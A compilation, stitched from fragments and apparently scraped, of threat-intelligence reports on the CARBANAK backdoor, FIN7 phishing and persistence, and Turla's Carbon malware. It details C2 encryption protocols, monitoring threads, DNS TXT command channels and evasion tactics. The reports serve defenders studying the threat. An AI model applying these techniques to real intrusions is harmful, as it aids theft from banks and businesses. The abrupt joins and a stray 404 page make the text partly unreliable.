Carbanak campaign is a clear indicator of a new era in cybercrime in which criminals use APT techniques directly against the ˜nancial industry instead of through its customers. APTs are not only for stealing information anymore. 24APPENDIX 1: C2 protocol decoders Decryptor #!/usr/bin/perl -w#Work with Carbanak c2 use strict;use warnings; use Crypt::CBC;use

Bennett, Barry Vengerik\\nMalware\\nCARBANAK\\nFLARE\\nFIN7\\nIn this blog, we will take a closer look at the powerful, versatile backdoor known as CARBANAK (aka Anunak). Specifically, we will focus on the operational details of its use over the past few years, including its configuration, the minor variations observed from sample to sample, and its evolution. With these details, we will then draw some conclusions about the operators of CARBANAK. For some additional background on the CARBANAK backdoor, see the papers by Kaspersky and Group-IB and Fox-It.\\nTechnical Analysis\\nBefore we dive into the meat of this blog, a brief technical analysis of the backdoor is necessary to provide some context. CARBANAK is a full-featured backdoor with data-stealing capabilities and a plugin architecture. Some of its capabilities include key logging, desktop video capture, VNC, HTTP form grabbing, file system management, file transfer, TCP tunneling, HTTP proxy, OS destruction, POS and Outlook data theft and reverse shell. Most of these data-stealing capabilities were present in the oldest variants of CARBANAK that we have seen and some were added over time.\\nMonitoring Threads\\nThe backdoor may optionally start one or more threads that perform continuous monitoring for various purposes, as described in Table 1.\\nThread Name\\nDescription\\nKey logger\\nLogs key strokes for configured processes and sends them to the command and control (C2) server\\nForm grabber\\nMonitors HTTP traffic for form data and sends it to the C2 server\\nPOS monitor\\nMonitors for changes to logs stored in C:\\\\NSB\\\\Coalition\\\\Logs and nsb.pos.client.log and sends parsed data to the C2 server\\nPST monitor\\nSearches recursively for newly created Outlook personal storage table (PST) files within user directories and sends them to the C2 server\\nHTTP proxy monitor\\nMonitors HTTP traffic for requests sent to HTTP proxies, saves the proxy address and credentials for future use\\nTable 1: Monitoring threads\\nCommands\\nIn addition to its file management capabilities, this data-stealing backdoor supports 34 commands that can be received from the C2 server. After decryption, these 34 commands are plain text with parameters that are space delimited much like a command line. The command and parameter names are hashed before being compared by the binary, making it difficult to recover the original names of commands and parameters.

It contains commands in the same form as those listed in Table 2 that are automatically executed by the backdoor when it is started. These commands are also executed when the loadconfig command is issued. This file can be likened to a startup script for the backdoor. The state command sets a global variable containing a series of Boolean values represented as ASCII values ‘0’ or ‘1’ and also adds itself to the configuration file. Some of these values indicate which C2 protocol to use, whether the backdoor has been installed, and whether the PST monitoring thread is running or not. Other than the state command, all commands in the configuration file are identified by their hash’s decimal value instead of their plain text name. Certain commands, when executed, add themselves to the configuration so they will persist across (or be part of) reboots. The loadconfig and state commands are executed during initialization, effectively creating the configuration file if it does not exist and writing the state command to it.\\nFigure 1 and Figure 2 illustrate some sample, decoded configuration files we have come across in our investigations.\\nFigure 1: Configuration file that adds new C2 server and forces the data-stealing backdoor to use it\\nFigure 2: Configuration file that adds TCP tunnels and records desktop video\\nCommand and Control\\nCARBANAK communicates to its C2 servers via pseudo-HTTP or a custom binary protocol.\\nPseudo-HTTP Protocol\\nMessages for the pseudo-HTTP protocol are delimited with the ‘|’ character. A message starts with a host ID composed by concatenating a hash value generated from the computer’s hostname and MAC address to a string likely used as a campaign code. Once the message has been formatted, it is sandwiched between an additional two fields of randomly generated strings of upper and lower case alphabet characters. An example of a command polling message and a response to the listprocess command are given in Figure 3 and Figure 4, respectively.\\nFigure 3: Example command polling message\\nFigure 4: Example command response message\\nMessages are encrypted using Microsoft’s implementation of RC2 in CBC mode with PKCS#5 padding. The encrypted message is then Base64 encoded, replacing all the ‘/’ and ‘+’ characters with the ‘.’ and ‘-’ characters, respectively. The eight-byte initialization vector (IV) is a randomly generated string consisting of upper and lower case alphabet characters. It is prepended to the encrypted and encoded message.\\nThe encoded payload is then made to look like a URI by having a random number of ‘/’ characters inserted at random locations within the encoded payload. The malware then appends a script extension (php, bml, or cgi) with a random number of random parameters or a file extension from the following list with no parameters: gif, jpg, png, htm, html, php.\\nThis URI is then used in a GET or POST request. The body of the POST request may contain files contained in the cabinet format. A sample GET request is shown in Figure 5.\\nFigure 5: Sample pseudo-HTTP beacon\\nThe pseudo-HTTP protocol uses any proxies discovered by the HTTP proxy monitoring thread or added by the adminka command. The backdoor also searches for proxy configurations to use in the registry at HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings and for each profile in the Mozilla Firefox configuration file at %AppData%\\\\Mozilla\\\\Firefox\\\\<ProfileName>\\\\prefs.js.\\nCustom Binary Protocol\\nFigure 6 describes the structure of the malware’s custom binary protocol. If a message is larger than 150 bytes, it is compressed with an unidentified algorithm. If a message is larger than 4096 bytes, it is broken into compressed chunks. This protocol has undergone several changes over the years, each version building upon the previous version in some way. These changes were likely introduced to render existing network signatures ineffective and to make signature creation more difficult.\\nFigure 6: Binary protocol message format\\nVersion 1\\nIn the earliest version of the binary protocol, we have discovered that the message bodies that are stored in the <chunkData> field are simply XORed with the host ID. The initial message is not encrypted and contains the host ID.\\nVersion 2\\nRather than using the host ID as the key, this version uses a random XOR key between 32 and 64 bytes in length that is generated for each session. This key is sent in the initial message.\\nVersion 3\\nVersion 3 adds encryption to the headers. The first 19 bytes of the message headers (up to the <hdrXORKey2> field) are XORed with a five-byte key that is randomly generated per message and stored in the <hdrXORKey2> field. If the <flag> field of the message header is greater than one, the XOR key used to encrypt message bodies is iterated in reverse when encrypting and decrypting messages.\\nVersion 4\\nThis version adds a bit more complexity to the header encryption scheme. The headers are XOR encrypted with <hdrXORKey1> and <hdrXORKey2> combined and reversed.\\nVersion 5\\nVersion 5 is the most sophisticated of the binary protocols we have seen. A 256-bit AES session key is generated and used to encrypt both message headers and bodies separately. Initially, the key is sent to the C2 server with the entire message and headers encrypted with the RSA key exchange algorithm. All subsequent messages are encrypted with AES in CBC mode. The use of public key cryptography makes decryption of the session key infeasible without the C2 server’s private key.\\nThe Roundup\\nWe have rounded up 220 samples of the CARBANAK backdoor and compiled a table that highlights some interesting details that we were able to extract. It should be noted that in most of these cases the backdoor was embedded as a packed payload in another executable or in a weaponized document file of some kind. The MD5 hash is for the original executable file that eventually launches CARBANAK, but the details of each sample were extracted from memory during execution. This data provides us with a unique insight into the operational aspect of CARBANAK and can be downloaded here.\\nProtocol Evolution\\nAs described earlier, CARBANAK’s binary protocol has undergone several significant changes over the years. Figure 7 illustrates a rough timeline of this evolution based on the compile times of samples we have in our collection. This may not be entirely accurate because our visibility is not complete, but it gives us a general idea as to when the changes occurred. It has been observed that some builds of this data-stealing backdoor use outdated versions of the protocol. This may suggest multiple groups of operators compiling their own builds of this data-stealing backdoor independently.\\nFigure 7: Timeline of binary protocol versions\\n*It is likely that we are missing an earlier build that utilized version 3.\\nBuild Tool\\nMost of CARBANAK’s strings are encrypted in order to make analysis more difficult. We have observed that the key and the cipher texts for all the encrypted strings are changed for each sample that we have encountered, even amongst samples with the same compile time. The RC2 key used for the HTTP protocol has also been observed to change among samples with the same compile time. These observations paired with the use of campaign codes that must be configured denote the likely existence of a build tool.\\nRapid Builds\\nDespite the likelihood of a build tool, we have found 57 unique compile times in our sample set, with some of the compile times being quite close in proximity. For example, on May 20, 2014, two builds were compiled approximately four hours apart and were configured to use the same C2 servers. Again, on July 30, 2015, two builds were compiled approximately 12 hours apart.\\nWhat changes in the code can we see in such short time intervals that would not be present in a build tool? In one case, one build was programmed to execute the runmem command for a file named wi.exe while the other was not. This command downloads an executable from the C2 and directly runs it in memory. In another case, one build was programmed to check for the existence of the domain blizko.net in the trusted sites list for Internet Explorer while the other was not. Blizko is an online money transfer service. We have also seen that different monitoring threads from Table 1 are enabled from build to build. These minor changes suggest that the code is quickly modified and compiled to adapt to the needs of the operator for particular targets.\\nCampaign Code and Compile Time Correlation\\nIn some cases, there is a close proximity of the compile time of a CARBANAK sample to the month specified in a particular campaign code. Figure 8 shows some of the relationships that can be observed in our data set.\\nCampaign Code\\nCompile Date\\nAug\\n7/30/15\\ndec\\n12/8/14\\njulyc\\n7/2/16\\njun\\n5/9/15\\njune\\n5/25/14\\njune\\n6/7/14\\njunevnc\\n6/20/14\\njuspam\\n7/13/14\\njuupd\\n7/13/14\\nmay\\n5/20/14\\nmay\\n5/19/15\\nndjun\\n6/7/16\\nSeP\\n9/12/14\\nspamaug\\n8/1/14\\nspaug\\n8/1/14\\nFigure 8: Campaign code to compile time relationships\\nRecent Updates\\nRecently, 64 bit variants of the backdoor have been discovered. We shared details about such variants in a recent blog post. Some of these variants are programmed to sleep until a configured activation date when they will become active.\\nHistory\\nThe “Carbanak Group”\\nMuch of the publicly released reporting surrounding the CARBANAK malware refers to a corresponding “Carbanak Group”, who appears to be behind the malicious activity associated with this data-stealing backdoor. FireEye iSIGHT Intelligence has tracked several separate overarching campaigns employing the CARBANAK tool and other associated backdoors, such as DRIFTPIN (aka Toshliph). With the data available at this time, it is unclear how interconnected these campaigns are – if they are all directly orchestrated by the same criminal group, or if these campaigns were perpetrated by loosely affiliated actors sharing malware and techniques.\\nFIN7\\nIn all Mandiant investigations to date where the CARBANAK backdoor has been discovered, the activity has been attributed to the FIN7 threat group. FIN7 has been extremely active against the U.S. restaurant and hospitality industries since mid-2015.\\nFIN7 uses CARBANAK as a post-exploitation tool in later phases of an intrusion to cement their foothold in a network and maintain access, frequently using the video command to monitor users and learn about the victim network, as well as the tunnel command to proxy connections into isolated portions of the victim environment. FIN7 has consistently utilized legally purchased code signing certificates to sign their CARBANAK payloads. Finally, FIN7 has leveraged several new techniques that we have not observed in other CARBANAK related activity.\\nWe have covered recent FIN7 activity in previous public blog posts:\\nFIN7 Spear Phishing Campaign Targets Personnel Involved in SEC Filings\\nFIN7 Evolution and the Phishing LNK\\nTo SDB, Or Not To SDB: FIN7 Leveraging Shim Databases for Persistence\\nThe FireEye iSIGHT Intelligence MySIGHT Portal contains additional information on our investigations and observations into FIN7 activity.\\nWidespread Bank Targeting Throughout the U.S., Middle East and Asia\\nProofpoint initially reported on a widespread campaign targeting banks and financial organizations throughout the U.S. and Middle East in early 2016. We identified several additional organizations in these regions, as well as in Southeast Asia and Southwest Asia being targeted by the same attackers.\\nThis cluster of activity persisted from late 2014 into early 2016. Most notably, the infrastructure utilized in this campaign overlapped with LAZIOK, NETWIRE and other malware targeting similar financial entities in these regions.\\nDRIFTPIN\\nDRIFTPIN (aka Spy.Agent.ORM, and Toshliph) has been previously associated with CARBANAK in various campaigns. We have seen it deployed in initial spear phishing by FIN7 in the first half of 2016. \\xa0Also, in late 2015, ESET reported on CARBANAK associated attacks, detailing a spear phishing campaign targeting Russian and Eastern European banks using DRIFTPIN as the malicious payload. Cyphort Labs also revealed that variants of DRIFTPIN associated with this cluster of activity had been deployed via the RIG exploit kit placed on two compromised Ukrainian banks’ websites.\\nFireEye iSIGHT Intelligence observed this wave of spear phishing aimed at a large array of targets, including U.S. financial institutions and companies associated with Bitcoin trading and mining activities. This cluster of activity continues to be active now to this day, targeting similar entities. Additional details on this latest activity are available on the FireEye iSIGHT Intelligence MySIGHT Portal.\\nEarlier CARBANAK Activity\\nIn December 2014, Group-IB and Fox-IT released a report about an organized criminal group using malware called \"Anunak\" that has targeted Eastern European banks, U.S. and European point-of-sale systems and other entities. Kaspersky released a similar report about the same group under the name \"Carbanak\" in February 2015. The name “Carbanak” was coined by Kaspersky in this report – the malware authors refer to the backdoor as Anunak.\\nThis activity was further linked to the 2014 exploitation of ATMs in Ukraine. Additionally, some of this early activity shares a similarity with current FIN7 operations – the use of Power Admin PAExec for lateral movement.\\nConclusion\\nThe details that can be extracted from CARBANAK provide us with a unique insight into the operational details behind this data-stealing malware. Several inferences can be made when looking at such data in bulk as we discussed above and are summarized as follows:\\nBased upon the information we have observed, we believe that at least some of the operators of CARBANAK either have access to the source code directly with knowledge on how to modify it or have a close relationship to the developer(s).\\nSome of the operators may be compiling their own builds of the backdoor independently.\\nA build tool is likely being used by these attackers that allows the operator to configure details such as C2 addresses, C2 encryption keys, and a campaign code. This build tool encrypts the binary’s strings with a fresh key for each build.\\nVarying campaign codes indicate that independent or loosely affiliated criminal actors are employing CARBANAK in a wide-range of intrusions that target a variety of industries but are especially directed at financial institutions across the globe, as well as the restaurant and hospitality sectors within the U.S.\\nPrevious Post\\nNext Post\\nPromotion\\nSubscribe\\nShare\\nRecent\\nRSS\\nEmail UpdatesInformation and insight on today\\'s advanced threats from FireEye.\\nShare\\nRecent Posts\\n24 Feb 2020Ransomware Against the Machine: How Adversaries are Learning to Disrupt\\nIndustrial Production by Targeting IT and OT\\n20 Feb 2020M-Trends 2020: Insights From the Front Lines\\n19 Feb 2020The Missing LNK — Correlating User Search LNK files\\nRSS Feed: Stay Connected\\nCompany\\nWhy FireEye?\\nCustomer Stories\\nCareers\\nCertifications and Compliance\\nInvestor Relations\\nSupplier Documents\\nNews and Events\\nNewsroom\\nPress Releases\\nWebinars\\nEvents\\nAwards and Honors\\nEmail Preferences\\nTechnical Support\\nIncident?\\nReport Security Issue\\nContact Support\\nCustomer Portal\\nCommunities\\nDocumentation Portal\\nFireEye Blogs\\nThreat Research\\nFireEye Stories\\nIndustry Perspectives\\nThreat Map\\nView the Latest Threats\\nContact Us\\n+1 877-347-3393\\nStay Connected\\nLinkedIn\\nTwitter\\nFacebook\\nYouTube\\nPodcast\\nCette page est également disponible en français.\\nVersion française\\nDiese Seite ist auch auf Deutsch verfügbar\\nZur deutschen Seite wechseln\\n日本語ページを\\n見る\\n해당 페이지는 한글 버전으로 보실 수 있습니다\\n바로 가기\\nContinue viewing this page in English\\nCopyright\\xa0©\\xa02020\\xa0FireEye, Inc.\\xa0All rights reserved.\\xa0Privacy & Cookies Policy | Privacy Shield | Legal Documentation\\nSite Language\\nEnglish\\nMy preferred language:\\nEnglish (English)\\nFrench (Français)\\nGerman (Deutsch)\\nJapanese (日本語)\\nKorean (한국어)\\nMore languages', 'This app works best with JavaScript enabled.DienstenTechnologieActueelTrainingenOver Fox-ITVacaturesContact24/7 emergency response404De pagina is niet gevondenHelaas bestaat deze pagina niet (meer).

Based on multiple identified overlaps in infrastructure and the use of similar tools, tactics, and procedures (TTPs), we have high confidence that this campaign is associated with the financially motivated threat group tracked by FireEye as FIN7.\\nFIN7 is a financially motivated intrusion set that selectively targets victims and uses spear phishing to distribute its malware. We have observed FIN7 attempt to compromise diverse organizations for malicious operations – usually involving the deployment of point-of-sale malware – primarily against the retail and hospitality industries.\\nSpear Phishing Campaign\\nAll of the observed intended recipients of the spear phishing campaign appeared to be involved with SEC filings for their respective organizations. Many of the recipients were even listed in their company’s SEC filings. The sender email address was spoofed as EDGAR <email\\xa0protected> and the attachment was named “Important_Changes_to_Form10_K.doc” (MD5: d04b6410dddee19adec75f597c52e386). An example email is shown in Figure 1.\\nFigure 1: Example of a phishing email sent during this campaign\\nWe have observed the following TTPs with this campaign:\\nThe malicious documents drop a VBS script that installs a PowerShell backdoor, which uses DNS TXT records for its command and control. This backdoor appears to be a new malware family that FireEye iSIGHT Intelligence has dubbed POWERSOURCE. POWERSOURCE is a heavily obfuscated and modified version of the publicly available tool DNS_TXT_Pwnage. The backdoor uses DNS TXT requests for command and control and is installed in the registry or Alternate Data Streams. Using DNS TXT records to communicate is not an entirely new finding, but it should be noted that this has been a rising trend since 2013 likely because it makes detection and hunting for command and control traffic difficult.\\nWe also observed POWERSOURCE being used to download a second-stage PowerShell backdoor called TEXTMATE in an effort to further infect the victim machine. The TEXTMATE backdoor provides a reverse shell to attackers and uses DNS TXT queries to tunnel interactive commands and other data. TEXTMATE is “memory resident” – often described as “fileless” malware. This is not a novel technique by any means, but it’s worth noting since it presents detection challenges and further speaks to the threat actor’s ability to remain stealthy and nimble in operations.\\nIn some cases, we identified a Cobalt Strike Beacon payload being delivered via POWERSOURCE. This particular Cobalt Strike stager payload was previously used in operations linked to FIN7.\\nWe observed that the same domain hosting the Cobalt Strike Beacon payload was also hosting a CARBANAK backdoor sample compiled in February 2017. CARBANAK malware has been used heavily by FIN7 in previous operations.\\nVictims\\nThus far, we have directly identified 11 targeted organizations in the following sectors:\\nFinancial services, with different victims having insurance, investment, card services, and loan focuses\\nTransportation\\nRetail\\nEducation\\nIT services\\nElectronics\\nAll these organizations are based in the United States, and many have international presences. As the SEC is a U.S. regulatory organization, we would expect recipients of these spear phishing attempts to either work for U.S.-based organizations or be U.S.-based representatives of organizations located elsewhere. However, it is possible that the attackers could perform similar activity mimicking other regulatory organizations in other countries.\\nImplications\\nWe have not yet identified FIN7’s ultimate goal in this campaign, as we have either blocked the delivery of the malicious emails or our FaaS team detected and contained the attack early enough in the lifecycle before we observed any data targeting or theft.\\xa0 However, we surmise FIN7 can profit from compromised organizations in several ways. If the attackers are attempting to compromise persons involved in SEC filings due to their information access, they may ultimately be pursuing securities fraud or other investment abuse. Alternatively, if they are tailoring their social engineering to these individuals, but have other goals once they have established a foothold, they may intend to pursue one of many other fraud types.\\nPrevious FIN7 operations deployed multiple point-of-sale malware families for the purpose of collecting and exfiltrating sensitive financial data. The use of the CARBANAK malware in FIN7 operations also provides limited evidence that these campaigns are linked to previously observed CARBANAK operations leading to fraudulent banking transactions, ATM compromise, and other monetization schemes.\\nCommunity Protection Event\\nFireEye implemented a Community Protection Event – FaaS, Mandiant, Intelligence, and Products – to secure all clients affected by this campaign. In this instance, an incident detected by FaaS led to the deployment of additional detections by the FireEye Labs team after FireEye Labs Advanced Reverse Engineering quickly analyzed the malware. Detections were then quickly deployed to the suite of FireEye products.\\nThe FireEye iSIGHT Intelligence MySIGHT Portal contains additional information based on our investigations of a variety of topics discussed in this post, including FIN7 and the POWERSOURCE and TEXTMATE malware.

These\\nmalicious actors are members of one of the most prolific financial\\nthreat groups of this decade, having carefully crafted attacks\\ntargeted at more than 100 organizations. FIN7 is referred to by many\\nvendors as “Carbanak Group,” although we do not equate all usage of\\nthe CARBANAK backdoor with FIN7. This blog explores the range of\\nFIN7\\'s criminal ventures, the technical innovation and social\\nengineering ingenuity that powered their success, a glimpse into their\\nrecent campaigns, their apparent use of a security company as a front\\nfor criminal operations, and what their success means for the threat\\nlandscape moving forward. With this release, FireEye is also providing\\ntechnical context, historical indicators, and techniques that\\norganizations can use to hunt for FIN7 behavior enterprise-wide.\\nFIN7 Does the Crime...\\nThe threat group is characterized by their persistent targeting and\\nlarge-scale theft of payment card data from victim systems, which it\\nhas monetized at least a portion of through a prominent card shop. But\\nFIN7’s financial operations were not limited to card data theft. In\\nsome instances, when they encountered and could not obtain payment\\ncard data from point of sale (POS) systems secured with end-to-end\\nencryption (E2EE) or point-to-point encryption (P2PE), FIN7 pivoted to\\ntarget finance departments within their victim organizations.\\nFurthermore, in April 2017, FireEye reported that\\xa0FIN7\\nsent spear phishing emails to personnel involved with United States\\nSecurities and Exchange Commission (SEC) filings\\xa0at multiple\\norganizations, providing further insight into FIN7’s targeting. These\\ntargeted individuals would likely have access to material non-public\\ninformation that FIN7 actors could use to gain a competitive advantage\\nin stock trading.\\nDiversification of their monetization tactics has allowed the group\\nto impact a wide range of industries beyond those solely associated\\nwith payment card industry. During campaigns that FireEye associates\\nwith FIN7, victims within the following sectors have been targeted\\nwithin the United States and Europe:\\nRestaurants\\nHospitality Casinos and Gaming Energy\\nFinance High-tech Software\\nTravel\\nEducation Construction Retail\\nTelecommunications Government Business\\nservices\\nFIN7’s Innovation Enabled their Success\\nThroughout FireEye’s tracking of FIN7 campaigns, the attackers have attempted to stay ahead of the game and thwart detection, using novel tactics and displaying characteristics of a well-resourced operation. For example, in April 2017, FireEye blogged about FIN7’s spear phishing emails that leveraged hidden shortcut files (LNK files) to initiate the infection and VBScript functionality launched by mshta.exe to infect the victim. This was a direct departure from their established use of weaponized Office macros and highlighted the group’s adaptive nature to evade detection.\\nFireEye also previously reported on FIN7’s use of the CARBANAK backdoor as a post-exploitation tool to cement their foothold in a network and maintain access to victim environments. CARBANAK is well known for its use in highly profitable and sophisticated attacks dating back to 2013, with usage attributable to FIN7 beginning in late 2015, although how interconnected the campaigns employing the malware over this five-year span are is unclear. FIN7’s use of CARBANAK is particularly notable due to their use of creative persistence mechanisms to launch the backdoor. The group leveraged an application shim database that injected a malicious in-memory patch into the Services Control Manager (\"services.exe\") process, and then spawned a CARBANAK backdoor process. FIN7 also used this tactic to install a payment card harvesting utility.\\nAnother notable characteristic of FIN7 has been their heavy use of digital certificates. Unsurprisingly, malicious threat actors have sought to exploit the legitimacy afforded by these certificates. By digitally signing their phishing documents, backdoors and later stage tools, FIN7 was able to bypass many security controls that may limit execution of macros from Office documents and restrict execution of unsigned binaries on trusted systems.\\nOrganization\\nCountry\\nSerial\\nEmail\\nKorsar Travel TOV\\nUA\\n88:21:ac:7e:6c:da:11:00:1d:b3:d3:1a:16:c1:5c:26\\nemail\\xa0protected\\nKaitschuck James\\nGB\\n30:2e:7f:14:3a:f3:f3:98:20:70:42:4e:ea:52:5d:d2\\nemail\\xa0protected\\nPark Travel\\nRU\\n4d:e2:87:56:98:bf:c7:74:a3:f3:47:d6:70:7c:9b:f0\\nemail\\xa0protected\\nTable 1: Sample FIN7 code signing certificates\\nFIN7 developed evasive techniques at a rapid pace. Throughout 2017, FIN7 was observed creating novel obfuscation methods, and in some cases modifying the methods on a daily basis while launching attacks targeting multiple victims. The threat group regularly tested malicious DOC, DOCX, and RTF phishing documents against public repositories to check static detection engine coverage. Their development of a payload obfuscation style using the Windows command interpreter\\'s (cmd.exe) native string substitution was so unique that FireEye dubbed it \"FINcoding.\" These methods inspired deep command line obfuscation research and the release of Daniel Bohannon\\'s Invoke-DOSfuscation. Reference Table 2 and Table 3 for a selection of samples and their associated command line obfuscation techniques.\\nFIN7’s Relentless Phone Calls and Bellyaching\\nOver the three years of responding to a multitude of compromises and proactively defending against FIN7, FireEye observed unprecedented social engineering prowess. From leveraging web forms for initial contact to targeting and engaging directly with pre-determined store managers, the operators demonstrated a range of capabilities. FIN7’s reach extended beyond their targets’ computer systems. FireEye has responded to incidents where FIN7 has called victims prior to lodging digital complaints laden with malicious documents as well as after the phishing documents have been sent, in order to check if they were received – a crude but effective FIN7 email delivery tracking technique.\\nAs FIN7 has matured, so did the quality of their phishing lures and templates, which were most often sent from fake but thoroughly disguised individuals and businesses – and occasionally from sender addresses impersonating legitimate government entities. Their phishing has often exploited urgent, high value business matters tailored to their chosen targets. At individual stores, managers were contacted about lost items or sent a “receipt” claiming overcharging. Other FIN7 phishing emails masqueraded as detailed catering orders or requests for special menus tailored to individuals with dietary restrictions.\\nIn early 2017, a pattern of complaints emerged and has continued for well over a year, where FIN7 has contacted stores and corporate offices to lodge food poisoning complaints with malicious attachments. Internally dubbed “FINdigestion” by FireEye, this pattern of detailed complaints eventually expanded beyond individual complaints and into litigious concerns raised on behalf of “the government”, as shown in Figure 1.\\nFigure 1: FDA themed spear phishing email\\nIt is noteworthy that the BATELEUR backdoor activity first identified by Proofpoint in July 2017, which FireEye tracks as a suspected FIN7 subgroup, uses highly-customized graphics for their targets, often created in Adobe Photoshop. In this same phishing campaign, FIN7’s malicious attachment was graphically themed to match, as shown in Figure 2.\\nFigure 2: FDA themed spear phishing attachment\\nThroughout their operations, the professional design and continued development of phishing elements in parallel to other post-compromise tools indicated to FireEye that FIN7 was most likely a well-resourced criminal operation.\\nIt’s Just Metadata\\nFireEye has tracked several FIN7 personas throughout their operations by collecting and parsing filetypes of forensic value for juicy metadata. In a previous blog, we shared how LNK files created by FIN7 unintentionally revealed valuable information about their development environment.\\nLNK files can contain metadata that reveals attributes about the systems on which the LNKs were created, including original file paths, volume serial numbers, MAC addresses, and hostnames. By studying values within the LNK metadata we often identify \"toolmarks,\" or unique values associated with distinct malware developer and operator personas.\\nFIN7 LNK metadata shows that the actors routinely used virtual machines with generic hostnames such as ANDY-PC or USER-PC, and default hostnames with the structure WIN-A-Z0-9{11} (e.g. WIN-ABCDEFGH1JK).\\nFireEye has tracked several hostname and path toolmarks associated with FIN7’s operations, which we have used to link clusters of threat activity together. These toolmarks may be linked to FIN7 members who are involved in tool development or the broader criminal operation. Notable personas from the technical data, which are explored in more detail in the Technical Appendix section, include:\\n\"andy\" / \"andy-pc\"\\n\"Hass\"\\n\"jimbo\"\\n\"Константин\" (Konstantin)\\n\"oleg\"\\nThis analysis allowed us to understand FIN7’s systems and correlate future attack activity to the different personas. Furthermore, the metadata analysis helped us monitor for files generated by the group and use the established toolmarks to establish detection for other adversary methodologies (such as direct RDP or SMB access) if the group changed TTPs.\\nVideo Playback of FIN7 Operations\\nWhile responding to multiple FIN7 intrusions, FireEye recovered a custom video recording capability used by FIN7 as a part of their operations. FireEye’s FLARE team reverse engineered the video protocol, which appeared to be custom-written by FIN7 as it has no external library dependencies, contained Cyrillic comments in the code, and required the use of a bespoke video player unique to FIN7. The attackers most likely leveraged this video recording capability in their arsenal to monitor operations in victim environments to inform later stages of their intrusions.\\nFireEye obtained a version\\xa0of the criminal developers’ video player from a trusted source and with the knowledge of the reverse engineered protocol, the FLARE team modified the source code to support multiple versions of FIN7’s custom encoding.\\u2002With the patched source code, FireEye can decode and playback FIN7’s video monitoring for affected victims in possession of these files.\\nRecent Shifts in FIN7 Operations\\nThroughout 2018, FireEye has continued to identify multiple domains registered using patterns consistent with prior FIN7 activity, as well as campaigns using disparate TTPs that we have attributed to FIN7 with varying degrees of confidence. ZIP archives delivering the BIRDDOG backdoor were hosted on a portion of suspected FIN7 domains registered in 2018. Some evidence further characterizing the nature of this campaign suggests these malicious documents were sent to financial institution customers in Eastern Europe and Central Asia as early as September 2017. The targeting of individuals rather than organizations would mark a significant shift in their targeting, although it is also possible that the banks spoofed in these campaigns were FIN7\\'s ultimate targets.\\nAdditionally, we have identified similarities between FIN7 activity and BATELEUR campaigns, which began as early as mid-2017 and have been primarily aimed at U.S.-based restaurant chains. These campaigns leveraged macro-embedded Word documents directly attached to the emails as well as ones hosted on Google Drive. The documents were meticulously crafted to appear as though they came from legitimate organizations (e.g. restaurant associations and suppliers of POS hardware). This suspected FIN7 activity continued past the date of most recent arrest announced by U.S. law enforcement, although the attackers are now leveraging an updated JavaScript backdoor dubbed GRIFFON.\\nThese recent campaigns could be representative of a decisive effort to diversify TTPs to avoid detection or could indicate the formation of FIN7 splinter groups carrying out autonomous campaigns. As a result, organizations need to remain vigilant and continue to monitor for changes in the methods employed by the FIN7 actors.\\nUnveiling FIN7’s Front Company and Industry\\nFigure 3: Combi Security logo as retrieved from 2016 cache of combisecurity.com\\nAccording to U.S. law enforcement, at least a portion of FIN7 activity was run out of a front company dubbed Combi Security. A cache of its website reveals that the company purported to be “the world leaders in the field of comprehensive protection of large information systems from modern cyber threats” with headquarters in Moscow, Haifa, and Odessa. We have identified job advertisements for Combi Security that have been posted on popular Russian, Ukrainian, and Uzbek job recruitment sites, as well as numerous individuals who most likely worked for the company. Due to the seeming legitimacy of the recruitment postings, some individuals may have been unaware of illicit nature of their work. While the recruitment of unwitting individuals as puppets has been a common component of at least some criminal schemes – for example, reshipping mules who are recruited through postings on career sites advertising attractive work-from-home jobs – FIN7’s veiling of full-scale financial compromises as legitimate offensive security engagements is particularly notable. The apparent success of Combi Security in recruiting unsuspecting individuals in this manner, may lead to more of this type of technical recruitment by cyber criminals in the future.\\nSplitting Up?\\nThe criminal organization behind FIN7 is almost certainly comprised of many additional individuals beyond those already apprehended by law enforcement authorities. FireEye iSIGHT Intelligence expects that at least a portion of these malicious actors are likely to continue conducting cyber crime activity in some capacity. Although we expect activity to continue, it is extremely common for threat actors to either modify their TTPs or temporarily halt operations following significant developments such as arrests of high-level members and/or public disclosure of TTPs that they employ.\\nDepending on the organizational and communication structure of the group, it is also plausible that multiple subgroups could form and carry out independent operations in the future. Recent campaigns, as well as those using tactics that were atypical for historical FIN7 campaigns, such as the SEC campaigns with widespread targeting, may be representative of semi-autonomous groups pre-existing within, or cooperating with, the FIN7 criminal organization. As noted in our CARBANAK overview, certain malware families and techniques transcend strictly defined threat groups, and may be re-used by developers and operators as they transition between organizations and campaigns.\\nConclusion\\nThese recent announcements by U.S. law enforcement highlight the positive impact that can result from synergy between private and public sector organizations in disrupting organized cyber crime operations. As demonstrated by FIN7, financially-motivated threat actors are becoming extremely advanced and are capable of inflicting significant harm on organizations through vast, but carefully orchestrated campaigns. As sophisticated threat groups continue to emerge, partnerships, such as those exhibited here, will almost certainly play a key role in combating these threats.\\nAcknowledgements\\nJordan Nuce, Tom Bennett, Michael Bailey, and Daniel Bohannon\\nTechnical Appendix\\nFireEye has responded to many FIN7 incidents, which has provided us extensive insight into their operations. As part of this blog post, we are also including numerous indicators that we attribute to FIN7 and an overview of their techniques to aid organizations in identifying malicious activity across their networks.\\nPhishing Documents Technical Details\\nIn addition to LNK metadata, FIN7 phishing documents consistently contained artifacts detailing the local file system paths of component files used to construct the spear phishing documents.

Recently, ESET found several new versions of Carbon.\\nESET Research 30 Mar 2017 - 02:00PM\\nShare\\nThe Turla espionage group has been targeting various institutions for many years. Recently, ESET found several new versions of Carbon.\\nThe Turla espionage group has been targeting various institutions for many years. Recently, we found several new versions of Carbon, a second stage backdoor in the Turla group arsenal. Last year, a technical analysis of this component was made by Swiss GovCERT.ch as part of their report detailing the attack that a defense firm owned by the Swiss government, RUAG, suffered in the past.\\nThis blog post highlights the technical innovations that we found in the latest versions of Carbon we have discovered.\\nLooking at the different versions numbers of Carbon we have, it is clear that it is still under active development. Through the internal versions embedded in the code, we see the new versions are pushed out regularly. The group is also known to change its tools once they are exposed. As such, we have seen that between two major versions, mutexes and file names are being changed.\\nInfection vectors\\nThe Turla group is known to be painstaking and work in stages, first doing reconnaissance on their victims’ systems before deploying their most sophisticated tools such as Carbon.\\nA classic Carbon compromise chain starts with a user receiving a spearphishing email or visiting a previously compromised website, typically one that the user visits regularly — a technique known as a watering hole attack.\\nAfter a successful attack, a first stage backdoor — such as Tavdig 1 or Skipper 2 — is installed on the user machine. Once the reconnaissance phase is over, a second stage backdoor, like 